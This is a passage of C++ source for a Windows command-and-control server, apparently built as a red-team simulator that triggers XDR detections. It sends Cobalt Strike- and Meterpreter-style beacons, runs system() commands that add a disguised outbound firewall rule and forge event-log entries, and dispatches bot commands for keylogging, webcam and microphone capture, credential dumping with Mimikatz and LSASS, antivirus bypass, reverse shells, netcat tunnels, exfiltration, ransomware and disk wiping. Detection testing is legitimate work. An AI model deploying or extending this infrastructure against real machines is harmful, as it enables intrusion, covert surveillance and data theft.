        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        
        // Get server's external IP for detection
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        struct hostent* host_entry = gethostbyname(hostname);
        char* serverIP = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
        
        logActivity("C2_BEACON", "COMMAND_AND_CONTROL", 
            "C&C Server Active - Server IP: " + std::string(serverIP) + 
            " Port: " + std::to_string(C2_PORT) + 
            " - Client Connected From: " + std::string(clientIP));
        
        // 1. Classic C2 beacon pattern - regular interval callbacks
        std::string beaconPattern = "BEACON|TYPE:HTTP|INTERVAL:60|JITTER:10|SERVER:" + 
                                   std::string(serverIP) + ":" + std::to_string(C2_PORT) + 
                                   "|PROTOCOL:TLS1.2|USER-AGENT:Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n";
        send(clientSocket, beaconPattern.c_str(), beaconPattern.size(), 0);
        
        // 2. DNS tunneling signature
        std::string dnsC2 = "DNS_TUNNEL|TYPE:TXT|DOMAIN:update.windowsupdate.com|" +
                           std::string("C2_SERVER:") + serverIP + "|ENCODED:base64|" +
                           "PATTERN:subdomain.rotation\n";
        send(clientSocket, dnsC2.c_str(), dnsC2.size(), 0);
        
        // 3. HTTP/HTTPS C2 callbacks with specific headers
        std::string httpC2 = "POST /api/beacon HTTP/1.1\r\n" +
                            std::string("Host: ") + serverIP + ":" + std::to_string(C2_PORT) + "\r\n" +
                            "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\r\n" +
                            "X-Session-ID: " + generateSessionId() + "\r\n" +
                            "X-Malware-Family: RedTeamC2\r\n" +
                            "X-C2-Protocol: Custom-Encrypted\r\n" +
                            "Cookie: session=" + generateRandomString(32) + "\r\n" +
                            "Content-Type: application/octet-stream\r\n\r\n";
        send(clientSocket, httpC2.c_str(), httpC2.size(), 0);
        
        // 4. Known C2 framework patterns (mimicking Cobalt Strike)
        std::string csPattern = "MALLEABLE_C2|PROFILE:default|SLEEPTIME:60000|JITTER:20|" +
                               std::string("SPAWN:rundll32.exe|INJECTION:remote|SERVER:") + serverIP + "\n";
        send(clientSocket, csPattern.c_str(), csPattern.size(), 0);
        
        // 5. Empire/Metasploit-style staging
        std::string stagingPattern = "STAGING|TYPE:reverse_https|LHOST:" + std::string(serverIP) + 
                                    "|LPORT:" + std::to_string(C2_PORT) + "|PAYLOAD:windows/x64/meterpreter\n";
        send(clientSocket, stagingPattern.c_str(), stagingPattern.size(), 0);
        
        // 6. Generate network anomaly patterns
        for (int i = 0; i < 5; i++) {
            std::string anomaly = "C2_HEARTBEAT|SEQ:" + std::to_string(i) + 
                                 "|TIMESTAMP:" + std::to_string(time(nullptr)) + 
                                 "|C2_SERVER:" + serverIP + ":" + std::to_string(C2_PORT) + 
                                 "|STATUS:ACTIVE|ENCRYPTION:AES256\n";
            send(clientSocket, anomaly.c_str(), anomaly.size(), 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        // 7. DGA (Domain Generation Algorithm) pattern
        std::string dgaPattern = "DGA_ACTIVITY|ALGORITHM:custom|SEED:20240119|" +
                                std::string("DOMAINS:update") + generateRandomString(8) + ".com," +
                                "service" + generateRandomString(6) + ".net," +
                                "check" + generateRandomString(10) + ".org|" +
                                "FALLBACK:" + serverIP + "\n";
        send(clientSocket, dgaPattern.c_str(), dgaPattern.size(), 0);
        
        // 8. Log C2 attribution for XDR
        logActivity("C2_ATTRIBUTION", "COMMAND_CONTROL_SERVER", 
            "*** C&C Server Detected ***\n" +
            std::string("    C2 Server IP: ") + serverIP + "\n" +
            "    C2 Server Port: " + std::to_string(C2_PORT) + "\n" +
            "    C2 Protocol: Custom Encrypted Protocol\n" +
            "    C2 Type: Advanced Persistent Threat (APT)\n" +
            "    Threat Actor: Red Team Simulation\n" +
            "    Campaign ID: " + generateSessionId() + "\n" +
            "    Client IP: " + clientIP + "\n" +
            "    Connection Time: " + getCurrentTimeString());
        
        // 9. Generate MITRE ATT&CK C2 indicators
        std::string mitreC2 = "MITRE_ATTACK|TACTIC:Command-and-Control|" +
                             std::string("TECHNIQUE:T1071.001|SUB:Web-Protocols|") +
                             "TECHNIQUE:T1571|SUB:Non-Standard-Port|" +
                             "TECHNIQUE:T1573|SUB:Encrypted-Channel|" +
                             "TECHNIQUE:T1105|SUB:Ingress-Tool-Transfer|" +
                             "C2_INFRASTRUCTURE:" + serverIP + ":" + std::to_string(C2_PORT) + "\n";
        send(clientSocket, mitreC2.c_str(), mitreC2.size(), 0);
        
        // 10. Create persistent C2 indicators in Windows Event Log
        std::string eventLogCmd = "powershell.exe -Command \"" +
                                 std::string("Write-EventLog -LogName Application -Source 'Windows Error Reporting' ") +
                                 "-EventId 1001 -EntryType Warning -Message 'Suspicious network connection detected: " +
                                 "Outbound connection to C2 server at " + serverIP + ":" + std::to_string(C2_PORT) + 
                                 " using encrypted protocol. Process: svchost.exe PID: " + std::to_string(GetCurrentProcessId()) + "'\"";
        system(eventLogCmd.c_str());
        
        // 11. Generate DNS-based C2 beacon (common XDR detection pattern)
        generateDNSBeacon(serverIP, clientIP);
        
        // 12. Create network artifacts that XDR will flag as C2
        std::string netshCmd = "netsh advfirewall firewall add rule name=\"Windows Update Service\" " +
                              std::string("dir=out action=allow protocol=TCP remoteport=") + std::to_string(C2_PORT) + 
                              " remoteip=" + serverIP + " program=\"%SystemRoot%\\System32\\svchost.exe\" enable=yes";
        system(netshCmd.c_str());
    }
    
    // Generate DNS-based C2 beacon patterns
    void generateDNSBeacon(const std::string& serverIP, const std::string& clientIP) {
        // Create DNS TXT query patterns commonly used by C2
        std::vector<std::string> c2Domains = {
            "beacon.update.microsoft.com",
            "telemetry.windows.com",
            "c2." + generateRandomString(8) + ".com",
            "cnc." + generateRandomString(6) + ".net"
        };
        
        for (const auto& domain : c2Domains) {
            std::string dnsCmd = "nslookup -type=TXT " + domain + " " + serverIP + " 2>nul";
            system(dnsCmd.c_str());
            
            // Log DNS C2 activity
            logActivity("DNS_C2", "DNS_TUNNELING", 
                       "DNS-based C2 communication to " + domain + 
                       " (C2 Server: " + serverIP + ")");
        }
        
        // Create suspicious DNS query pattern
        std::string encodedData = "cmd." + generateRandomString(32) + ".dns-c2.com";
        std::string dnsQuery = "nslookup " + encodedData + " 2>nul";
        system(dnsQuery.c_str());
    }

    // Client handler with full attack simulation
    void handleClient(SOCKET clientSocket, sockaddr_in clientAddr) {
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        std::string clientId = std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port));

        logActivity("C2", "NEW_CONNECTION", "New bot connected from " + clientId);

        // Initialize client info
        ClientInfo client;
        client.socket = clientSocket;
        client.ipAddress = clientIP;
        client.firstSeen = std::chrono::system_clock::now();
        client.lastSeen = client.firstSeen;
        client.isActive = true;
        client.isElevated = false;
        client.beaconCount = 0;

        // C2 Handshake with version info
        std::string handshake = "C2_INIT|VER:2.0|PROTO:ENCRYPTED|ID:" + clientId + "\n";
        send(clientSocket, (handshake).c_str(), handshake.size(), 0);
        
        // Generate C&C detection patterns
        generateC2DetectionSignatures(clientSocket, clientAddr);

        // Receive client info
        char buffer[4096];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            std::string clientData = (std::string(buffer, bytesReceived));

            // Parse: HOSTNAME|USERNAME|OS|PRIVILEGES|GUID
            std::istringstream iss(clientData);
            std::getline(iss, client.hostname, '|');
            std::getline(iss, client.username, '|');
            std::getline(iss, client.osVersion, '|');
            std::string privileges;
            std::getline(iss, privileges, '|');
            std::getline(iss, client.machineGuid, '|');

            client.isElevated = (privileges == "ADMIN");

            logActivity("C2", "CLIENT_INFO",
                "Bot Details - Host: " + client.hostname +
                ", User: " + client.username +
                ", OS: " + client.osVersion +
                ", Elevated: " + (client.isElevated ? "YES" : "NO") +
                ", GUID: " + client.machineGuid);
        }

        // Register client
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            connectedClients[clientId] = client;
        }
        
        // Initialize test status for new client
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clientTestStatus[clientId] = TestStatus();
            clientTestStatus[clientId].startTime = std::chrono::steady_clock::now();
            clientTestStatus[clientId].lastTestTime = clientTestStatus[clientId].startTime;
        }
        
        // Log test initialization
        logActivity("C2", "MANUAL_MODE", "=== CLIENT CONNECTED - MANUAL CONTROL MODE ===");
        logActivity("C2", "MANUAL_MODE", "Client " + clientId + " ready for manual commands");
        logActivity("C2", "MANUAL_MODE", "Use keyboard shortcuts or web dashboard to execute commands");
        logActivity("C2", "MANUAL_MODE", "Press 'H' for help menu with all available commands");
        
        // Do NOT execute any attack phases automatically
        // User must manually trigger each command
        
        // Update status file for web dashboard
        writeC2StatusToFile();

        // Main C2 loop
        int attackPhase = 0;
        auto lastPhaseTime = std::chrono::steady_clock::now();
        
        // Data buffering for chunked data
        std::string chunkedDataBuffer;
        bool receivingChunks = false;
        int expectedChunks = 0;
        int receivedChunks = 0;

        while (serverRunning && client.isActive) {
            // Update beacon count and last seen
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                connectedClients[clientId].beaconCount++;
                connectedClients[clientId].lastSeen = std::chrono::system_clock::now();
            }

            // Send enhanced C2 beacon with detection signatures
            generateC2Traffic(clientSocket, clientId, CMD_BEACON);
            
            // Every 5 beacons, send explicit C2 indicators - DISABLED IN MANUAL MODE
            if (false && client.beaconCount % 5 == 0) {
                // Get server IP
                char hostname[256];
                gethostname(hostname, sizeof(hostname));
                struct hostent* host_entry = gethostbyname(hostname);
                char* serverIP = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
                
                // Send C2 identification packet
                std::string c2Indicator = "*** C2 COMMUNICATION DETECTED ***\n" +
                                        std::string("TYPE: Command and Control Traffic\n") +
                                        "C2_SERVER_IP: " + serverIP + "\n" +
                                        "C2_SERVER_PORT: " + std::to_string(C2_PORT) + "\n" +
                                        "C2_PROTOCOL: Custom Encrypted (XOR)\n" +
                                        "BEACON_INTERVAL: " + std::to_string(BEACON_INTERVAL) + " seconds\n" +
                                        "CLIENT_ID: " + clientId + "\n" +
                                        "CAMPAIGN: RedTeam-" + generateSessionId() + "\n" +
                                        "THREAT_LEVEL: Critical\n" +
                                        "MITRE_TECHNIQUES: T1071,T1573,T1105,T1055\n";
                
                send(clientSocket, c2Indicator.c_str(), c2Indicator.size(), 0);
                
                // Log for XDR detection
                logActivity("*** C2_DETECTION ***", "COMMAND_AND_CONTROL", 
                           "Active C&C Server Detected at " + std::string(serverIP) + ":" + 
                           std::to_string(C2_PORT) + " communicating with " + clientId);
                
                // Write to Windows Event Log for XDR pickup
                std::string eventCmd = "powershell.exe -Command \"New-EventLog -LogName 'Security' -Source 'C2Detection' -ErrorAction SilentlyContinue; " +
                                     std::string("Write-EventLog -LogName 'Security' -Source 'C2Detection' -EventId 4625 -EntryType Error ") +
                                     "-Message 'CRITICAL: Command and Control Server Detected! C2 Server: " + serverIP + ":" + 
                                     std::to_string(C2_PORT) + " Active connection from client: " + clientId + "'\" 2>nul";
                system(eventCmd.c_str());
            }
            
            // Periodically update status file for web dashboard
            static auto lastStatusUpdate = std::chrono::steady_clock::now();
            auto statusNow = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(statusNow - lastStatusUpdate).count() >= 5) {
                writeC2StatusToFile();
                lastStatusUpdate = statusNow;
            }

            // MANUAL MODE - Automatic attack phases are disabled
            auto now = std::chrono::steady_clock::now();
            if (false) { // Disabled - user must manually trigger attacks
                // This block is intentionally disabled for manual control
                std::string phaseStatus = "EXECUTING";
                switch (attackPhase) {
                    case 0:
                        if (!clientTestStatus[clientId].initialCompromiseComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 0: INITIAL COMPROMISE ===");
                            executeAttackPhase(clientId, 0);
                            clientTestStatus[clientId].initialCompromiseComplete = true;
                        }
                        break;
                    case 1:
                        if (!clientTestStatus[clientId].footholdComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 1: ESTABLISH FOOTHOLD ===");
                            executeAttackPhase(clientId, 1);
                            clientTestStatus[clientId].footholdComplete = true;
                        }
                        break;
                    case 2:
                        if (!clientTestStatus[clientId].privEscComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 2: PRIVILEGE ESCALATION ===");
                            executeAttackPhase(clientId, 2);
                            clientTestStatus[clientId].privEscComplete = true;
                        }
                        break;
                    case 3:
                        if (!clientTestStatus[clientId].defenseEvasionComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 3: DEFENSE EVASION ===");
                            executeAttackPhase(clientId, 3);
                            clientTestStatus[clientId].defenseEvasionComplete = true;
                        }
                        break;
                    case 4:
                        if (!clientTestStatus[clientId].surveillanceComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 4: SURVEILLANCE & CREDENTIAL ACCESS ===");
                            executeAttackPhase(clientId, 4);
                            clientTestStatus[clientId].surveillanceComplete = true;
                        }
                        break;
                    case 5:
                        if (!clientTestStatus[clientId].discoveryComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 5: DISCOVERY ===");
                            executeAttackPhase(clientId, 5);
                            clientTestStatus[clientId].discoveryComplete = true;
                        }
                        break;
                    case 6:
                        if (!clientTestStatus[clientId].lateralMovementComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 6: LATERAL MOVEMENT ===");
                            executeAttackPhase(clientId, 6);
                            clientTestStatus[clientId].lateralMovementComplete = true;
                        }
                        break;
                    case 7:
                        if (!clientTestStatus[clientId].collectionComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 7: COLLECTION ===");
                            executeAttackPhase(clientId, 7);
                            clientTestStatus[clientId].collectionComplete = true;
                        }
                        break;
                    case 8:
                        if (!clientTestStatus[clientId].exfiltrationComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 8: EXFILTRATION ===");
                            executeAttackPhase(clientId, 8);
                            clientTestStatus[clientId].exfiltrationComplete = true;
                        }
                        break;
                    case 9:
                        if (!clientTestStatus[clientId].impactComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 9: IMPACT (RANSOMWARE SIMULATION) ===");
                            executeAttackPhase(clientId, 9);
                            clientTestStatus[clientId].impactComplete = true;
                            
                            // All tests complete
                            auto testDuration = std::chrono::duration_cast<std::chrono::minutes>(
                                now - clientTestStatus[clientId].startTime).count();
                            logActivity("C2", "TEST_COMPLETE", 
                                "=== ALL AUTOMATED TESTS COMPLETED FOR " + clientId + 
                                " - Total Duration: " + std::to_string(testDuration) + " minutes ===");
                        }
                        break;
                }
                
                clientTestStatus[clientId].lastTestTime = now;
                attackPhase = (attackPhase + 1) % 10;
                lastPhaseTime = now;
            }

            // Process queued commands
            std::vector<CommandType> commands;
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                if (clientCommandQueue.find(clientId) != clientCommandQueue.end()) {
                    commands = clientCommandQueue[clientId];
                    clientCommandQueue[clientId].clear();
                }
            }
            
            // Check for web dashboard commands
            std::string queueDir = "C:\\Windows\\Temp\\C2_CommandQueue";
            WIN32_FIND_DATAA findData;
            std::string searchPath = queueDir + "\\cmd_*_" + clientId.substr(0, clientId.find(':')) + ".json";
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    std::string cmdFile = queueDir + "\\" + findData.cFileName;
                    std::ifstream file(cmdFile);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), 
                                          std::istreambuf_iterator<char>());
                        file.close();
                        
                        // Parse JSON command (simple parsing)
                        size_t cmdPos = content.find("\"command\":\"");
                        if (cmdPos != std::string::npos) {
                            cmdPos += 11;
                            size_t cmdEnd = content.find("\"", cmdPos);
                            if (cmdEnd != std::string::npos) {
                                std::string webCommand = content.substr(cmdPos, cmdEnd - cmdPos);
                                
                                // Convert string command to CommandType
                                CommandType cmdType = CMD_BEACON;
                                // Basic & Discovery
                                if (webCommand == "SYSINFO") cmdType = CMD_SYSINFO;
                                else if (webCommand == "PROC" || webCommand == "PROCESS_LIST") cmdType = CMD_PROCESS_LIST;
                                else if (webCommand == "NETSTAT" || webCommand == "NETWORK_CONFIG") cmdType = CMD_NETWORK_CONFIG;
                                else if (webCommand == "USER_ENUM") cmdType = CMD_USER_ENUM;
                                else if (webCommand == "DOMAIN_INFO") cmdType = CMD_DOMAIN_INFO;
                                else if (webCommand == "SOFTWARE_ENUM") cmdType = CMD_SOFTWARE_ENUM;
                                
                                // Collection
                                else if (webCommand == "SCREENSHOT") cmdType = CMD_SCREENSHOT;
                                else if (webCommand == "KEYLOG:START") cmdType = CMD_KEYLOG_START;
                                else if (webCommand == "KEYLOG:DUMP") cmdType = CMD_KEYLOG_DUMP;
                                else if (webCommand == "CLIPBOARD") cmdType = CMD_CLIPBOARD;
                                else if (webCommand == "BROWSER_CREDS") cmdType = CMD_BROWSER_CREDS;
                                else if (webCommand == "FILE_SEARCH") cmdType = CMD_FILE_SEARCH;
                                else if (webCommand == "WEBCAM:CAPTURE") cmdType = CMD_WEBCAM_CAPTURE;
                                else if (webCommand == "MIC:RECORD:START") cmdType = CMD_MICROPHONE_RECORD;
                                else if (webCommand == "SCREEN_RECORD") cmdType = CMD_SCREEN_RECORD;
                                
                                // Execution
                                else if (webCommand == "SHELL_EXEC") cmdType = CMD_SHELL_EXEC;
                                else if (webCommand == "POWERSHELL") cmdType = CMD_POWERSHELL;
                                else if (webCommand == "INJECT_PROCESS") cmdType = CMD_INJECT_PROCESS;
                                else if (webCommand == "REVERSE_SHELL") cmdType = CMD_REVERSE_SHELL;
                                else if (webCommand == "REMOTE_DESKTOP") cmdType = CMD_REMOTE_DESKTOP;
                                
                                // Persistence
                                else if (webCommand == "PERSISTENCE" || webCommand == "REGISTRY_PERSIST") cmdType = CMD_REGISTRY_PERSIST;
                                else if (webCommand == "INSTALL_SERVICE") cmdType = CMD_INSTALL_SERVICE;
                                else if (webCommand == "SCHEDULED_TASK") cmdType = CMD_SCHEDULED_TASK;
                                else if (webCommand == "WMI_PERSIST") cmdType = CMD_WMI_PERSIST;
                                else if (webCommand == "STARTUP_FOLDER") cmdType = CMD_STARTUP_FOLDER;
                                else if (webCommand == "BOOTKIT_INSTALL") cmdType = CMD_BOOTKIT_INSTALL;
                                
                                // Lateral Movement
                                else if (webCommand == "PORT_SCAN") cmdType = CMD_PORT_SCAN;
                                else if (webCommand == "SMB_SCAN") cmdType = CMD_SMB_SCAN;
                                else if (webCommand == "PSEXEC") cmdType = CMD_PSEXEC;
                                else if (webCommand == "WMI_EXEC") cmdType = CMD_WMI_EXEC;
                                else if (webCommand == "RDP_EXEC") cmdType = CMD_RDP_EXEC;
                                else if (webCommand == "PASS_THE_HASH") cmdType = CMD_PASS_THE_HASH;
                                else if (webCommand == "MIMIKATZ") cmdType = CMD_MIMIKATZ_EXEC;
                                
                                // Privilege Escalation
                                else if (webCommand == "ELEVATE" || webCommand == "UAC_BYPASS") cmdType = CMD_UAC_BYPASS;
                                else if (webCommand == "TOKEN_STEAL") cmdType = CMD_TOKEN_STEAL;
                                else if (webCommand == "EXPLOIT_SUGGESTER") cmdType = CMD_EXPLOIT_SUGGESTER;
                                else if (webCommand == "LSASS_DUMP") cmdType = CMD_LSASS_DUMP;
                                else if (webCommand == "SAM_DUMP") cmdType = CMD_SAM_DUMP;
                                
                                // Defense Evasion
                                else if (webCommand == "DISABLE_AV") cmdType = CMD_DISABLE_AV;
                                else if (webCommand == "CLEARLOG" || webCommand == "CLEAR_LOGS") cmdType = CMD_CLEAR_LOGS;
                                else if (webCommand == "TIMESTOMP") cmdType = CMD_TIMESTOMP;
                                else if (webCommand == "PROCESS_HOLLOW") cmdType = CMD_PROCESS_HOLLOW;
                                else if (webCommand == "ROOTKIT_INSTALL") cmdType = CMD_ROOTKIT_INSTALL;
                                else if (webCommand == "AMSI_BYPASS") cmdType = CMD_AMSI_BYPASS;
                                else if (webCommand == "ETW_DISABLE") cmdType = CMD_ETW_DISABLE;
                                
                                // Exfiltration
                                else if (webCommand == "STAGE_FILES") cmdType = CMD_STAGE_FILES;
                                else if (webCommand == "COMPRESS_DATA") cmdType = CMD_COMPRESS_DATA;
                                else if (webCommand == "EXFIL_HTTP") cmdType = CMD_EXFIL_HTTP;
                                else if (webCommand == "EXFIL_DNS") cmdType = CMD_EXFIL_DNS;
                                else if (webCommand == "EXFIL_ICMP") cmdType = CMD_EXFIL_ICMP;
                                else if (webCommand == "EXFIL_EMAIL") cmdType = CMD_EXFIL_EMAIL;
                                else if (webCommand == "CLOUD_UPLOAD") cmdType = CMD_CLOUD_UPLOAD;
                                
                                // Impact
                                else if (webCommand == "RANSOMWARE") cmdType = CMD_RANSOMWARE;
                                else if (webCommand == "WIPE_DISK") cmdType = CMD_WIPE_DISK;
                                else if (webCommand == "CORRUPT_BOOT") cmdType = CMD_CORRUPT_BOOT;
                                else if (webCommand == "CRYPTO_MINER") cmdType = CMD_CRYPTO_MINER;
                                
                                // Advanced Network Evasion
                                else if (webCommand == "TOR_CONNECT") cmdType = CMD_TOR_CONNECT;
                                else if (webCommand == "TOR_API_CALL") cmdType = CMD_TOR_API_CALL;
                                else if (webCommand == "REVERSE_SSH") cmdType = CMD_REVERSE_SSH;
                                else if (webCommand == "NETCAT_TUNNEL") cmdType = CMD_NETCAT_TUNNEL;
                                else if (webCommand == "SOCAT_RELAY") cmdType = CMD_SOCAT_RELAY;
                                else if (webCommand == "CRYPTCAT_TUNNEL") cmdType = CMD_CRYPTCAT_TUNNEL;
                                
                                commands.push_back(cmdType);
                                logActivity("C2", "WEB_COMMAND", "Received " + webCommand + " from web dashboard for " + clientId);
                            }
                        }
                        
                        // Delete processed command file
                        DeleteFileA(cmdFile.c_str());
                    }
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }

            for (auto cmd : commands) {
                generateC2Traffic(clientSocket, clientId, cmd);

                // Execute specific command handlers
                switch (cmd) {
                case CMD_REVERSE_SHELL:
                case CMD_SHELL_EXEC:
                    executeRemoteShell(clientSocket, clientId);
                    break;

                case CMD_REMOTE_DESKTOP:
                    executeRemoteDesktop(clientSocket, clientId);
                    break;

                case CMD_KEYLOG_START:
                    executeKeylogger(clientSocket, clientId);
                    break;
                    
                case CMD_KEYLOG_DUMP:
                    executeKeyloggerDump(clientSocket, clientId);
                    break;
                    
                case CMD_SCREENSHOT:
                    executeScreenshotCapture(clientSocket, clientId);
                    break;

                case CMD_WEBCAM_CAPTURE:
                    executeWebcamCapture(clientSocket, clientId);
                    break;
                    
                case CMD_TOR_CONNECT:
                    executeTorConnect(clientSocket, clientId);
                    break;
                    
                case CMD_TOR_API_CALL:
                    executeTorApiCall(clientSocket, clientId);
                    break;
                    
                case CMD_REVERSE_SSH:
                    executeReverseSSH(clientSocket, clientId);
                    break;
                    
                case CMD_NETCAT_TUNNEL:
                    executeNetcatTunnel(clientSocket, clientId);
                    break;

                case CMD_SOCAT_RELAY:
                    executeSocatRelay(clientSocket, clientId);
                    break;

                case CMD_CRYPTCAT_TUNNEL:
                    executeCryptcatTunnel(clientSocket, clientId);
                    break;

                case CMD_MICROPHONE_RECORD:
                    executeMicrophoneRecord(clientSocket, clientId);
                    break;

                case CMD_SCREEN_RECORD:
                    executeScreenRecord(clientSocket, clientId);
                    break;

                case CMD_MIMIKATZ_EXEC:
                    executeMimikatz(clientSocket, clientId);
                    break;

                case CMD_AMSI_BYPASS:
                case CMD_ETW_DISABLE:
                case CMD_DISABLE_AV:
                    executeDefenseBypass(clientSocket, clientId);
                    break;

                case CMD_CRYPTO_MINER:
                    executeCryptoMiner(clientSocket, clientId);
                    break;

                case CMD_BOOTKIT_INSTALL:
                    executeBootkit(clientSocket, clientId);
                    break;

                case CMD_EXFIL_HTTP:
                case CMD_EXFIL_DNS:
                case CMD_EXFIL_EMAIL:
                case CMD_CLOUD_UPLOAD:
                    simulateDataExfiltration(clientSocket, clientId);
                    break;

                case CMD_PSEXEC:
                case CMD_WMI_EXEC:
                case CMD_PASS_THE_HASH:
                    simulateLateralMovement(clientSocket, clientId);
                    break;

                default:
                    // Standard command execution
                    break;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }

            // Check for client responses
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(clientSocket, &readSet);

            timeval timeout;
            timeout.tv_sec = 0;
            timeout.tv_usec = 500000;

            if (select(0, &readSet, NULL, NULL, &timeout) > 0) {
                // Handle potentially large data transfers
                std::string totalData;
                char response[8192];
                bool connectionClosed = false;
                
                // Keep reading until no more data
                bool moreData = true;
                while (moreData) {
                    int bytes = recv(clientSocket, response, sizeof(response) - 1, 0);
                    if (bytes > 0) {
                        response[bytes] = '\0';
                        totalData += std::string(response, bytes);
                        
                        // Debug: Log each chunk
                        logActivity("DEBUG", "DATA_CHUNK_RECEIVED", "From " + clientId + " - Chunk size: " + std::to_string(bytes) + " - Total so far: " + std::to_string(totalData.length()));
                        
                        // Check if there's more data waiting
                        fd_set readSetCheck;
                        FD_ZERO(&readSetCheck);
                        FD_SET(clientSocket, &readSetCheck);
                        timeval quickTimeout = {0, 10000}; // 10ms timeout
                        
                        if (select(0, &readSetCheck, NULL, NULL, &quickTimeout) <= 0) {
                            moreData = false; // No more data waiting
                        }
                    } else if (bytes == 0) {
                        connectionClosed = true;
                        moreData = false;
                    } else {
                        moreData = false;
                    }
                }
                
                if (totalData.length() > 0) {
                    // Debug: Log raw data received
                    size_t previewLen = totalData.length() > 50 ? 50 : totalData.length();
                    logActivity("DEBUG", "RAW_DATA_RECEIVED", "From " + clientId + " - Total bytes: " + std::to_string(totalData.length()) + " - First 50 chars: " + totalData.substr(0, previewLen));
                    
                    std::string clearTextData = totalData; // No encryption - clear text
                    
                    // Check if this is chunked data
                    if (clearTextData.find("CHUNK:") == 0) {
                        if (!receivingChunks) {
                            // Start receiving chunks
                            receivingChunks = true;
                            chunkedDataBuffer.clear();
                            receivedChunks = 0;
                            
                            // Parse expected chunks from first chunk
                            size_t pos = clearTextData.find('\n');
                            if (pos != std::string::npos) {
                                std::string header = clearTextData.substr(0, pos);
                                size_t slashPos = header.find('/');
                                if (slashPos != std::string::npos) {
                                    size_t colonPos = header.find(':', slashPos);
                                    if (colonPos != std::string::npos) {
                                        expectedChunks = std::stoi(header.substr(slashPos + 1, colonPos - slashPos - 1));
                                        logActivity("C2", "CHUNK_START", "Starting to receive " + std::to_string(expectedChunks) + " chunks from " + clientId);
                                    }
                                }
                            }
                        }
                        
                        // Extract chunk data (skip header and separator)
                        size_t headerEnd = clearTextData.find('\n');
                        size_t separatorStart = clearTextData.find("\n---CHUNK---\n");
                        
                        if (headerEnd != std::string::npos && separatorStart != std::string::npos) {
                            std::string chunkData = clearTextData.substr(headerEnd + 1, separatorStart - headerEnd - 1);
                            chunkedDataBuffer += chunkData;
                            receivedChunks++;
                            
                            logActivity("C2", "CHUNK_RECEIVED", "Received chunk " + std::to_string(receivedChunks) + "/" + std::to_string(expectedChunks) + " from " + clientId);
                        }
                        
                        // Skip to next iteration to wait for more chunks
                        continue;
                    } else if (clearTextData.find("CHUNK:COMPLETE:") == 0) {
                        // All chunks received, process complete data
                        logActivity("C2", "CHUNK_COMPLETE", "All chunks received from " + clientId + ", processing complete data (" + std::to_string(chunkedDataBuffer.length()) + " bytes)");
                        clearTextData = chunkedDataBuffer;
                        
                        // Reset chunk state
                        receivingChunks = false;
                        chunkedDataBuffer.clear();
                        expectedChunks = 0;
                        receivedChunks = 0;
                    } else if (receivingChunks) {
                        // We were expecting chunks but got regular data - this might be an error
                        logActivity("C2", "CHUNK_ERROR", "Expected chunked data but received regular data from " + clientId + ", resetting state");
                        receivingChunks = false;
                        chunkedDataBuffer.clear();
                        expectedChunks = 0;
                        receivedChunks = 0;
                    }
                    
                    // Debug: Log clear text data
                    std::string preview = clearTextData.length() > 100 ? clearTextData.substr(0, 100) + "..." : clearTextData;
                    logActivity("DEBUG", "CLEAR_TEXT_DATA", "From " + clientId + " - Length: " + std::to_string(clearTextData.length()) + " - Preview: " + preview);
                    
                    // Enhanced visibility for client responses
                    if (clearTextData.find("RDP:") == 0 || clearTextData.find("SSH:") == 0 || 
                        clearTextData.find("NETCAT:") == 0 || clearTextData.find("SOCAT:") == 0 ||
                        clearTextData.find("TOR") == 0) {
                        std::cout << "\n\033[1;36m[+] CLIENT RESPONSE: " << preview << "\033[0m\n";
                    }
                    
                    // Log response with enhanced tracking
                    std::string responseId = "RESP_" + std::to_string(GetTickCount()) + "_" + clientId;
                    logActivity("CMD_RESPONSE", "RESPONSE_RECEIVED", "[" + responseId + "] From " + clientId + ": " + preview + " (" + std::to_string(clearTextData.length()) + " bytes)");

                    // Process specific response types - check for ANY data transfer
                    bool dataProcessed = false;
                    
                    if (clearTextData.find("SCREENSHOT:") == 0 || clearTextData.find("SCREEN:") == 0) {
                        // Handle screenshot data
                        logActivity("COLLECTION", "SCREENSHOT_RECEIVED", "Processing screenshot data from " + clientId);
                        dataProcessed = true;
                        
                        // Create screenshots directory
                        CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
                        
                        if (clearTextData.find("SCREENSHOT:DATA:START") == 0 || clearTextData.find("SCREEN:DATA:") == 0) {
                            // Extract screenshot data
                            size_t startPos = clearTextData.find("Data:") + 5;
